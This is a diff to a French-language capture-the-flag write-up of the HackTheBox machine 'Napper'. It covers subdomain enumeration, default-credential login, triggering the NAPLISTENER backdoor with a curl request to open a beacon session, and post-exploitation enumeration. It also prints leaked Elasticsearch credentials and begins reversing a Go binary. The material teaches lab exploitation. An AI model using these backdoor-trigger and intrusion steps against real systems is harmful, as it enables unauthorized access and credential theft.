@@ -47,7 +47,11 @@ Nmap done: 1 IP address (1 host up) scanned in 157.02 seconds
 
 On a donc juste un serveur `Internet Information Services` qui tourne sur le port 443 / 80 et et qui héberge entre autre le sous-domaine `app.napper.htb`. Après avoir ajouté le nom de domaine dans notre fichier `/etc/hosts` voilà à quoi ressemble le site web hébergé:
 
-![](./assets/blog.PNG)
+<div>
+    <img src="assets/blog.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+
+# Enumeration
 
 Ca ressemble à un blog de hacking classique avec un thème hugo, on va tenter deux énumérations: Une sur les chemins d'accès du site et l'autre sur les sous-domaines. Pour l'énumération des sous-domaines avec gobuster, il faut bien passer par l'option `vhost` qui va injecter dans l'en-tête `Host` et pas par l'option `dns` qui elle va se baser sur des requêtes DNS. De plus sur les version récentes, bien penser à mettre l'option `--append-domain` lorsque l'on teste avec le domaine de base.
 
@@ -103,11 +107,15 @@ Found: internal.napper.htb Status: 401 [Size: 1293]
 
 Après avoir ajouté le sous domaine au fichier hosts, on est vite stoppé par une demande d'authentification et après avoir testé les méthodes classiques de confusions de méthodes, on peut se décider à aller chercher dans le contenu du blog en quête d'indices:
 
-![](./assets/posts.PNG)
+<div>
+    <img src="assets/posts.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
 
 L'article qui attire naturellement l'attention c'est celui qui traite de la mise en place de la `Basic Authentication` sur un IIS avec Powershell:
 
-![](./assets/auth.PNG)
+<div>
+    <img src="assets/auth.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
 
 Ici le tutoriel suivi utilise une `Secure-String` basée sur un mot de passe en clair, on peut donc tester les identifiants: `example` / `ExamplePassword` au cas où le propriétaire du blog aurait simplement copié collé le contenu du tutoriel, et Bingo!
 
@@ -125,7 +133,11 @@ date: Sun, 07 Jan 2024 00:13:09 GMT
 
 On a maintenant accès au sous domaine interne du site avec un article en plus:
 
-![](./assets/internal.PNG)
+<div>
+    <img src="assets/internal.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+
+# Accès
 
 Hmm il est question d'une backdoor nommée `NAPLISTENER` (qui existe vraiment, il y'a de la doc à son sujet [ici](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)). Cette backdoor serait donc testée actuellement par l'équipe d'analyse de malware sur la machine, il va nous falloir trouver un moyen d'y avoir accès. En se renseignant un peu on découvre que la backdoor est censée exécuté un assembly .NET encodé en Base64 et passé à l'endpoint `/ews/MsExgHealthCheckd/` dans le paramètre `sdafwe3rwe23`. Pour vérifier que le serveur IIS est bien infecté par la backdoor on peut remarquer la présence d'un en-tête `server` supplémentaire renvoyé lorsque l'on accède à l'endpoint utilisé par la backdoor:
 
@@ -228,5 +240,178 @@ curl  -k "https://10.10.11.240:443/ews/MsExgHealthCheckd/" --data-urlencode "sda
 
 Et on obtient bien une session sur le `TeamServer`:
 
+<div>
+    <img src="assets/session_ruben.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
 
-[ ASSETS ]
+Cette sessions tourne sous l'utilisateur `ruben` à un niveau d'intégrité standard:
+
+```txt
+USER INFORMATION
+----------------
+
+User Name    SID                                           
+============ ==============================================
+napper\ruben S-1-5-21-1567175541-2888103920-4161894620-1001
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\BATCH                   Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+```
+
+Après avoir récupéré le flag user à `C:\Users\ruben\Desktop\user.txt`, on commence à chercher aux endroits habituels pour pour trouver un moyen de privesc:
+
+* `C:\inetpub` (là où est stocké le code et les données d'un serveur IIS)
+* `C:\Users\ruben` (Le dossier utilisateur)
+* `C:\Program Files\` (Le dossier d'installation des programmes par défault)
+
+On peut aussi essayer de lister les ports ouverts en interne pour trouver des services internes:
+
+```txt
+Proto  Local Address          Foreign Address        State           PID
+
+TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
+TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
+TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       2896
+TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       672
+TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516
+TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1080
+TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1464
+TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       652
+TCP    10.10.11.240:139       0.0.0.0:0              LISTENING       4
+TCP    127.0.0.1:9200         0.0.0.0:0              LISTENING       4852
+TCP    127.0.0.1:9300         0.0.0.0:0              LISTENING       4852
+TCP    [::]:80                [::]:0                 LISTENING       4
+TCP    [::]:135               [::]:0                 LISTENING       896
+TCP    [::]:443               [::]:0                 LISTENING       4
+TCP    [::]:445               [::]:0                 LISTENING       4
+TCP    [::]:49664             [::]:0                 LISTENING       672
+TCP    [::]:49665             [::]:0                 LISTENING       516
+TCP    [::]:49666             [::]:0                 LISTENING       1080
+TCP    [::]:49667             [::]:0                 LISTENING       1464
+TCP    [::]:49668             [::]:0                 LISTENING       652
+UDP    0.0.0.0:123            *:*                                    6032
+UDP    0.0.0.0:5050           *:*                                    2896
+UDP    0.0.0.0:5353           *:*                                    1880
+UDP    0.0.0.0:5355           *:*                                    1880
+UDP    10.10.11.240:137       *:*                                    4
+UDP    10.10.11.240:138       *:*                                    4
+UDP    10.10.11.240:1900      *:*                                    4668
+UDP    10.10.11.240:62071     *:*                                    4668
+UDP    127.0.0.1:1900         *:*                                    4668
+UDP    127.0.0.1:49664        *:*                                    2752
+UDP    127.0.0.1:62072        *:*                                    4668
+UDP    [::]:123               *:*                                    6032
+UDP    [::]:5353              *:*                                    1880
+UDP    [::]:5355              *:*                                    1880
+UDP    [::1]:1900             *:*                                    4668
+UDP    [::1]:62070            *:*                                    4668
+UDP    [fe80::b5d1:843e:603a:e055%10]:1900  *:*                                    4668
+UDP    [fe80::b5d1:843e:603a:e055%10]:62069  *:*                                    4668
+```
+
+Les ports 9200 et 9300 sont associés au service `Elasticsearch`. C'est dans le dossier temporaire `C:\Temp` qu'on trouve le code du blog:
+
+```txt
+[01/07 10:38:05] beacon> ls
+[01/07 10:38:05] [*] Tasked beacon to list files in .
+[01/07 10:38:05] [+] host called home, sent: 19 bytes
+[01/07 10:38:05] [*] Listing: c:\Temp\www\internal\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     06/09/2023 00:18:40   archetypes
+          dir     06/08/2023 11:14:20   assets
+          dir     06/09/2023 00:18:40   content
+          dir     06/08/2023 11:14:20   data
+          dir     06/08/2023 11:14:20   layouts
+          dir     06/09/2023 00:18:41   public
+          dir     06/09/2023 00:18:40   resources
+          dir     06/08/2023 11:14:20   static
+          dir     06/09/2023 00:18:41   themes
+ 0b       fil     06/09/2023 00:18:40   .hugo_build.lock
+ 1003b    fil     06/09/2023 00:18:40   hugo.toml
+```
+
+Dans le dossier `content` qui contient le contenu des articles en MarkDown on remarque un article qui n'est pas encore publié sur le blog
+
+```txt
+---
+title: "**INTERNAL** Getting rid of LAPS"
+description: Replacing LAPS with out own custom solution
+date: 2023-07-01
+draft: true 
+tags: [internal, sysadmin] 
+---
+
+# Intro
+
+We are getting rid of LAPS in favor of our own custom solution. 
+The password for the `backup` user will be stored in the local Elastic DB.
+
+IT will deploy the decryption client to the admin desktops once it it ready. 
+
+We do expect the development to be ready soon. The Malware RE team will be the first test group.
+```
+
+Il explique que le serveur Elasticsearch est entre autre utilisé pour garder le mot de passe de l'utilisateur `backup` et que la machine implémente une solution custom pour le générer à la place de [LAPS](https://www.it-connect.fr/chapitres/quest-ce-que-microsoft-laps/). Dans le dossier `internal-laps-alpha` On trouve la version alpha du système LAPS custom:
+
+```txt
+[01/07 11:08:24] beacon> cd internal-laps-alpha
+[01/07 11:08:24] [*] cd internal-laps-alpha
+[01/07 11:08:24] [+] host called home, sent: 27 bytes
+[01/07 11:08:26] beacon> ls
+[01/07 11:08:26] [*] Tasked beacon to list files in .
+[01/07 11:08:26] [+] host called home, sent: 19 bytes
+[01/07 11:08:26] [*] Listing: c:\Temp\www\internal\content\posts\internal-laps-alpha\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 82b      fil     06/09/2023 00:28:35   .env
+ 12mb     fil     06/09/2023 00:20:07   a.exe
+```
+
+On télécharge les deux fichiers pour pouvoir en faire une analyse plus approfondie.
+
+# Rétro-ingéniérie
+
+Le premier fichier contient un ensemble de variables d'environnement et le second est un exécutable Windows:
+
+```txt
+cat .env
+ELASTICUSER=user
+ELASTICPASS=DumpPassword\$Here
+
+ELASTICURI=https://127.0.0.1:9200
+
+file a.exe
+a.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 13 sections
+```
+
+On charge le binaire dans IDA et on découvre que le binaire a été codé en Go ce qui va nous compliquer un peu la tâche. Heureusement le binaire n'est pas complètement strippé ce qui fait qu'entre autre les noms des `RTTI` seront toujours présents ce qui ne sera pas du luxe pour faire le retypage.
